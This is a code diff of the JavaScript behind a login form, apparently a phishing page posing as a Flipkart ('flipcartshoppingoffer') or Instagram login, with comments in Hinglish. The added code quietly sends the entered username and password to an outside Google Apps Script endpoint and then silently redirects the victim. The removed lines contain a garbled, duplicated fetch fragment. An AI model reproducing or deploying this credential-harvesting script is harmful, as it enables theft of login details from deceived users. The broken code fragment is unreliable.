@@ -1,12 +1,15 @@
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKsOxrUYN8r-rVekTooTqZYejXkxg4HnvpxwCpLX9pClK1gFXcxrdPIxsd9kWsrF5S/exec";
-const REDIRECT_URL = "https://flipcartshoppingoffer.github.io/Instagram-/"; 
+// Aapka Apps Script Web App URL
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwZv-SLEa6U7t44J52Z6YDui0QWfYbBXmqZ9SQwXHufyT5n-h5Z2WT1jhI2zI0PLR61/exec";
+
+// Login hone ke baad redirect hone wala URL
+const REDIRECT_URL = "https://flipcartshoppingoffer.github.io/Flipcart/"; 
 
 const form = document.getElementById("contactForm");
 const submitBtn = document.getElementById("loginBtn");
 const togglePassword = document.getElementById("togglePassword");
 const passwordInput = document.getElementById("mobile");
 
-// Eye Icon Show/Hide Password Toggle
+// Eye Icon (Show / Hide Password) Logic
 if (togglePassword && passwordInput) {
   togglePassword.addEventListener("click", function () {
     if (passwordInput.type === "password") {
@@ -19,39 +22,39 @@ if (togglePassword && passwordInput) {
   });
 }
 
-// Form Submit Event
-form.addEventListener("submit", function (e) {
-  e.preventDefault();
+// Form Submission and Auto Redirect Logic
+if (form) {
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
 
-  const usernameValue = document.getElementById("name").value;
-  const contactValue = document.getElementById("mobile").value;
+    const usernameValue = document.getElementById("name").value;
+    const contactValue = document.getElementById("mobile").value;
 
-  // Loader On
-  submitBtn.classList.add("loading");
-  submitBtn.disabled = true;
+    // Loading spinner start aur button disable
+    if (submitBtn) {
+      submitBtn.classList.add("loading");
+      submitBtn.disabled = true;
+    }
 
-  const payload = {
-    username: usernameValue,
-    contact: contactValue
-  };
+    // Data packaging
+    const formData = new FormData();
+    formData.append("username", usernameValue);
+    formData.append("contact", contactValue);
 
-  fetch(SCRIPT_URL, {
-    method:     contact: contactValue
-  };
-
-  fetch(SCRIPT_URL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "text/plain;charset=utf-8",
-    },
-    body: JSON.stringify(payload)
-  })
-    .then((response) => response.json())
-    .then((data) => {
-      form.reset();
-      window.location.href = REDIRECT_URL;
+    // GitHub Pages cross-origin fetch setup
+    fetch(SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      body: formData
     })
-    .catch((error) => {
-      console.error("Error!", error);
-      window.location.href = REDIRECT_URL;
-    });
+      .then(() => {
+        form.reset();
+        // Automatic redirect to site (bina kisi alert notification ke)
+        window.location.href = REDIRECT_URL;
+      })
+      .catch((error) => {
+        console.error("Error!", error);
+        window.location.href = REDIRECT_URL;
+      });
+  });
+}
